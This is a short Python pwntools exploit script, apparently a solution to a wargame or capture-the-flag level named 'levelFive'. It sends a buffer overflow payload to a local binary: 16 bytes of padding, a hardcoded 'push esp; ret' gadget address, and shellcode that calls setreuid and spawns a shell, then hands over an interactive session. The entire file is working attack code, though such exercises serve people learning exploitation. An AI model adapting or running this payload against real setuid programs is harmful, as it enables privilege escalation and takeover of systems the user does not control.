#!/usr/bin/python2.7

from pwn import *

p = process("./levelFive")

buf = ''
buf += 'A' * 16

buf += p32(0xF7F059C6) # 0x001379c6: push esp; ret;
buf += asm(shellcraft.i386.linux.setreuid())
buf += asm(shellcraft.i386.linux.sh())

p.sendline(buf)
p.interactive()

